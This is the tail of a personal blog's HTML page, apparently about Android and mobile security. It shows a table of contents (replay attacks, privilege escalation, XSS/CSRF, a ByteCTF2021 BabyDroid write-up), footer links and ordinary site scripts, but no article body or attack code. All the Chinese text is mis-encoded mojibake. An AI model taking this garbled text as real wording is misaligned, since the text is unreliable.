class="toc-text">é€šä¿¡å®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6%E6%9C%89%E6%95%88%E6%80%A7"><span class="toc-text">è¯ä¹¦æœ‰æ•ˆæ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%92%8C%E6%A0%A1%E6%A3%80"><span class="toc-text">å…³é”®æ•°æ®åŠ å¯†å’Œæ ¡æ£€</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-text">è®¿é—®æ§åˆ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9B%B4%E6%96%B0%E5%AE%89%E5%85%A8%E6%80%A7"><span class="toc-text">å®¢æˆ·ç«¯æ›´æ–°å®‰å…¨æ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E4%BF%A1%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB"><span class="toc-text">çŸ­ä¿¡é‡æ”¾æ”»å‡»</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8"><span class="toc-text">ä¸šåŠ¡å®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-text">è¶Šæƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E6%98%93%E7%AF%A1%E6%94%B9"><span class="toc-text">äº¤æ˜“ç¯¡æ”¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB"><span class="toc-text">é‡æ”¾æ”»å‡»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-text">ç”¨æˆ·æšä¸¾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">æš´åŠ›ç ´è§£</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5-XSS-CSRF"><span class="toc-text">æ³¨å…¥&#x2F;XSS&#x2F;CSRF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">æ¼æ´çš„ä¸€äº›åˆ†æ ByteCTF2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BabyDroid"><span class="toc-text">BabyDroid</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A"><span class="toc-text">è€ƒç‚¹ï¼š</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apk%E5%88%86%E6%9E%90"><span class="toc-text">apkåˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">åˆ©ç”¨æ€è·¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack%E5%AE%9E%E7%8E%B0"><span class="toc-text">Attackå®ç°</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-color: transparent;"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">æ ¼è¨€ğŸ§¬</p><div class="bg-ad"><div>å†çœ‹çœ‹é‚£ä¸ªå…‰ç‚¹ï¼Œå®ƒå°±åœ¨è¿™é‡Œï¼Œè¿™æ˜¯å®¶å›­ï¼Œè¿™æ˜¯æˆ‘ä»¬ â€”â€” ä½ æ‰€çˆ±çš„æ¯ä¸€ä¸ªäººï¼Œä½ è®¤è¯†çš„ä¸€ä¸ªäººï¼Œä½ å¬è¯´è¿‡çš„æ¯ä¸€ä¸ªäººï¼Œæ›¾ç»æœ‰è¿‡çš„æ¯ä¸€ä¸ªäººï¼Œéƒ½åœ¨å®ƒä¸Šé¢åº¦è¿‡ä»–ä»¬çš„ä¸€ç”Ÿâœ¨</div><div class="btn-xz-box"><a class="btn-xz" target="_blank" rel="noopener" href="https://stellarium.org/">ç‚¹å‡»å¼€å¯æ˜Ÿè¾°ä¹‹æ—…</a></div></div></div><div class="t-t-r"><p class="ft-t t-l-t">çŒœä½ æƒ³çœ‹ğŸ’¡</p><ul class="ft-links"><li><!--a(href='/posts/eec9786.html') é­”æ”¹æŒ‡å—--><a href="/personal/bb/">æˆ‘çš„å” å¨</a><a href="/box/nav/">ç½‘å€å¯¼èˆª</a></li><li><a href="/social/link/">æˆ‘çš„æœ‹å‹</a><a href="/comments/">ç•™ç‚¹ä»€ä¹ˆ</a></li><li><a href="/personal/about/">å…³äºä½œè€…</a><a href="/archives/">æ–‡ç« å½’æ¡£</a></li><li><a href="/categories/">æ–‡ç« åˆ†ç±»</a><a href="/tags/">æ–‡ç« æ ‡ç­¾</a></li><li><!--a(href='/box/Gallery/') æˆ‘çš„ç”»å»Š--><!--a(href='/personal/bb/') æˆ‘çš„å” å¨--></li><li><!--a(href='/site/time/') å»ºè®¾è¿›ç¨‹--><!--a(href='/site/census/') ç½‘ç«™ç»Ÿè®¡--></li></ul></div></div></div><div class="ft-item-2"><p class="ft-t">æ¨èå‹é“¾âŒ›</p><div class="ft-img-group"><div class="img-group-item"><a href="https://zxk1ng.github.io/" title="zxk1ng"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/img.png" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="å¹¿å‘Šä½æ‹›ç§Ÿ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div></div></div></div><div class="copyright"><span><b>&copy;2022-2025</b></span><span><b>&nbsp;&nbsp;By zxk1ng</b></span></div><div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" title="åšå®¢æ¡†æ¶ä¸ºHexo_v6.3.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Frame-Hexo-blue.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" title="ä¸»é¢˜ç‰ˆæœ¬Butterfly_v4.3.1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Theme-Butterfly-6513df.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" title="æœ¬ç«™é‡‡ç”¨å¤šçº¿éƒ¨ç½²ï¼Œä¸»çº¿è·¯æ‰˜ç®¡äºVercel"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Hosted-Vercel-brightgreen.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://user.51.la/" style="margin-inline:5px" title="æœ¬ç«™æ•°æ®åˆ†æå¾—ç›Šäº51laæŠ€æœ¯æ”¯æŒ"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/Analytics-51la-3db1eb.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20226665" style="margin-inline:5px" title="æœ¬ç«™å·²åŠ å…¥èŒICPè±ªåå¥—é¤ï¼ŒèŒICPå¤‡20226665å·"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/èŒICPå¤‡-20226665-fe1384.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://bitiful.dogecast.com/buckets" style="margin-inline:5px" title="æœ¬ç½‘ç«™ç»Service Workeråˆ†æµè‡³ç¼¤çº·äº‘å¯¹è±¡å­˜å‚¨"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Bucket-ç¼¤çº·äº‘-9c62da.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.netdun.net/" style="margin-inline:5px" title="æœ¬ç«™ä½¿ç”¨ç½‘ç›¾æ˜Ÿçƒæä¾›CDNåŠ é€Ÿä¸é˜²æŠ¤"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://sourcebucket.s3.ladydaily.com/badge/CDN-ç½‘ç›¾æ˜Ÿçƒ-fff2cc.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" title="æœ¬ç½‘ç«™æºç ç”±Githubæä¾›å­˜å‚¨ä»“åº“"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src=" https://sourcebucket.s3.ladydaily.com/badge/Source-Github-d021d6.svg" alt=""/></a></p></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button><button class="share" type="button" title="å³é”®æ¨¡å¼" onclick="changeMouseMode()"><i class="fas fa-mouse"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog right_side"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button class="share" type="button" title="åˆ†äº«é“¾æ¥" onclick="share()"><i class="fas fa-share-nodes"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i><span id="percent">0<span>%</span></span></button><button id="go-down" type="button" title="ç›´è¾¾åº•éƒ¨" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åº“åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" href="javascript:rmf.scrollToTop();"><i class="fa fa-arrow-up"></i></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>å¤åˆ¶</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.baidu.com/s?wd=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa fa-search"></i><span>ç™¾åº¦æœç´¢</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>è½¬åˆ°é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>ç²˜è´´</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fas fa-comment"></i><span>ç©ºé™è¯„è®º</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>å¤åˆ¶æœ¬æ–‡åœ°å€</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>æ–°çª—å£æ‰“å¼€</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>è½¬åˆ°é“¾æ¥</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>å¤åˆ¶é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>ä¿å­˜å›¾ç‰‡</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>åœ¨æ–°çª—å£æ‰“å¼€</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>å¤åˆ¶å›¾ç‰‡é“¾æ¥</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:randomPost()"><i class="fa fa-paper-plane"></i><span>éšä¾¿é€›é€›</span></a><a class="rightMenu-item" href="javascript:switchNightMode();"><i class="fa fa-moon"></i><span>æ˜¼å¤œåˆ‡æ¢</span></a><a class="rightMenu-item" href="/personal/about/"><i class="fa fa-info-circle"></i><span>å…³äºåšå®¢</span></a><a class="rightMenu-item" href="javascript:toggleWinbox();"><i class="fas fa-cog"></i><span>ç¾åŒ–è®¾ç½®</span></a><a class="rightMenu-item" href="javascript:rmf.fullScreen();"><i class="fas fa-expand"></i><span>åˆ‡æ¢å…¨å±</span></a><a class="rightMenu-item" href="javascript:window.print();"><i class="fa-solid fa-print"></i><span>æ‰“å°é¡µé¢</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.umd.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js" type="module"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/vanilla-lazyload/17.3.1/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script async="async">var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())
setTimeout(function(){preloader.endLoading();}, 5000);
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: '',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: '',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.staticfile.org/twikoo/1.6.8/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script src="https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js"></script><script async src="https://cdn1.tianli0.top/npm/vue@2.6.14/dist/vue.min.js"></script><script async src="https://cdn1.tianli0.top/npm/element-ui@2.15.6/lib/index.js"></script><script async src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script><script defer type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script async src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script defer src="https://cdn1.tianli0.top/gh/nextapps-de/winbox/dist/winbox.bundle.min.js"></script><script async src="//at.alicdn.com/t/c/font_3586335_hsivh70x0fm.js"></script><script async src="//at.alicdn.com/t/c/font_3636804_gr02jmjr3y9.js"></script><script async src="//at.alicdn.com/t/c/font_3612150_kfv55xn3u2g.js"></script><script async src="https://cdn.wpon.cn/2022-sucai/Gold-ingot.js"></script><canvas id="universe"></canvas><canvas id="snow"></canvas><script defer src="/js/fomal.js"></script><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn1.tianli0.top/npm/js-heo@1.0.12/metingjs/Meting.min.js"></script><script src="https://lib.baomitu.com/pjax/0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#web_bg",".js-pjax","#bibi","body > title","#app","#tag-echarts","#posts-echart","#categories-echarts"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
    var parent = document.getElementById('recent-posts');
    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/AndroidæŠ“åŒ…/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¡ å°Zã®AndroidæŠ“åŒ…è®°å½• (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/Androidé€†å‘/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¼ å°Zã®Androidé€†å‘è®°å½• (5)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/NDKå¼€å‘/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ‰ å°Zã®NDKå¼€å‘è®°å½• (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/ç§»åŠ¨å®‰å…¨/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸŸ å°Zã®ç§»åŠ¨å®‰å…¨è®°å½• (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/é˜…è¯»/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¨ å°Zã®é˜…è¯»è®°å½• (3)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/è„±å£³/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¥ å°Zã®è„±å£³è®°å½• (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><a class="magnet_link_more"  href="https://zxk1ng.github.io/categories" style="flex:1;text-align: center;margin-bottom: 10px;">æŸ¥çœ‹æ›´å¤š...</a></div></div>';
    console.log('å·²æŒ‚è½½magnet')
    parent.insertAdjacentHTML("afterbegin",child)}
     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(33.333333333333336% - 5px);background: #e9e9e9;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: var(--text-bg-hover)}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
    <style></style> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
    var parent = document.getElementById('recent-posts');
    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/AndroidæŠ“åŒ…/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¡ å°Zã®AndroidæŠ“åŒ…è®°å½• (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/Androidé€†å‘/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¼ å°Zã®Androidé€†å‘è®°å½• (5)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/NDKå¼€å‘/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ‰ å°Zã®NDKå¼€å‘è®°å½• (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/ç§»åŠ¨å®‰å…¨/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸŸ å°Zã®ç§»åŠ¨å®‰å…¨è®°å½• (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/é˜…è¯»/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¨ å°Zã®é˜…è¯»è®°å½• (3)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://zxk1ng.github.io/categories/è„±å£³/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">ğŸ¥ å°Zã®è„±å£³è®°å½• (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><a class="magnet_link_more"  href="https://zxk1ng.github.io/categories/" style="flex:1;text-align: center;margin-bottom: 10px;">æŸ¥çœ‹æ›´å¤š...</a></div></div>';
    console.log('å·²æŒ‚è½½magnet')
    parent.insertAdjacentHTML("afterbegin",child)}
